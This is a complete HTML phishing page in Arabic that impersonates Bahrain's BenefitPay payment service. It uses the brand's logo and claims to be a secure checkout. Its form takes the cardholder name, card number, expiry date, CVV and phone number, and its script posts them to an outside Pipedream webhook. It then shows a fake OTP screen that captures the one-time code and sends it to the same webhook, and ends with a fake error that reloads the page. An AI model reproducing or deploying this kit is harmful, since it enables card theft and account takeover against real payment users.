<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BenefitPay - Bahrain</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; overflow-x: hidden; }
        .header { background-color: #e21e26; color: white; padding: 15px; text-align: center; position: relative; }
        .header img { width: 40px; vertical-align: middle; }
        .container { padding: 20px; }
        .card { background: white; border-radius: 15px; padding: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-top: -30px; }
        .status-bar { display: flex; justify-content: space-between; font-size: 12px; color: #666; margin-bottom: 15px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        .btn { background-color: #e21e26; color: white; border: none; width: 100%; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #loading, #otp-screen { display: none; text-align: center; padding: 40px 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e21e26; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .flag { width: 25px; vertical-align: middle; margin-left: 5px; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Benefit_Logo.png" alt="Logo">
    <span style="font-weight: bold;">BenefitPay</span>
    <p style="font-size: 12px; margin: 5px 0 20px;">نظام الدفع الآمن في البحرين <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/2/2c/Flag_of_Bahrain.svg"></p>
</div>

<div class="container">
    <div id="main-card" class="card">
        <div class="status-bar">
            <span>مرجع: BP-9928374</span>
            <span style="color: green;">● آمن</span>
        </div>
        <h3 style="text-align: center; color: #e21e26;">تفاصيل الدفع</h3>
        <form id="payForm">
            <div class="input-group">
                <label>الاسم الكامل</label>
                <input type="text" name="holder" placeholder="كما هو موضح على البطاقة" required>
            </div>
            <div class="input-group">
                <label>رقم البطاقة</label>
                <input type="number" name="card" placeholder="0000 0000 0000 0000" required>
            </div>
            <div style="display: flex; gap: 10px;">
                <div class="input-group" style="flex: 2;">
                    <label>تاريخ الانتهاء</label>
                    <input type="text" name="exp" placeholder="MM/YY" required>
                </div>
                <div class="input-group" style="flex: 1;">
                    <label>CVV</label>
                    <input type="password" name="cvv" placeholder="***" required>
                </div>
            </div>
            <div class="input-group">
                <label>رقم الهاتف</label>
                <input type="number" name="phone" placeholder="3XXX XXXX">
            </div>
            <button type="button" class="btn" onclick="sendData()">تأكيد الدفع</button>
        </form>
    </div>

    <div id="otp-screen" class="card">
        <h3 style="color: #e21e26;">التحقق من الهوية</h3>
        <p>تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
        <div class="input-group">
            <input type="number" id="otp_val" placeholder="أدخل رمز OTP">
        </div>
        <button class="btn" onclick="sendOTP()">تأكيد الرمز</button>
    </div>

    <div id="loading" class="card">
        <div class="spinner"></div>
        <p id="loading-text">جاري معالجة البيانات بأمان...</p>
    </div>
</div>

<script>
    const webhook = "https://eoalpp741z4q119.m.pipedream.net"; // رابطك الخاص

    function sendData() {
        const form = document.getElementById('payForm');
        const formData = new FormData(form);
        
        // إخفاء البيانات وإظهار التحميل مؤقتاً
        document.getElementById('main-card').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        fetch(webhook, {
            method: 'POST',
            body: new URLSearchParams(formData)
        });

        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('otp-screen').style.display = 'block';
        }, 3000);
    }

    function sendOTP() {
        const otp = document.getElementById('otp_val').value;
        
        document.getElementById('otp-screen').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        document.getElementById('loading-text').innerText = "جاري التحقق من الرمز...";

        fetch(webhook, {
            method: 'POST',
            body: new URLSearchParams({'OTP_Code': otp})
        });

        // المرحلة الأخيرة: انتظار ثم رسالة خطأ
        setTimeout(() => {
            alert("عذراً، الرمز المدخل غير صحيح أو انتهت صلاحيته. يرجى إعادة التأكيد.");
            location.reload(); 
        }, 5000);
    }
</script>

</body>
</html>
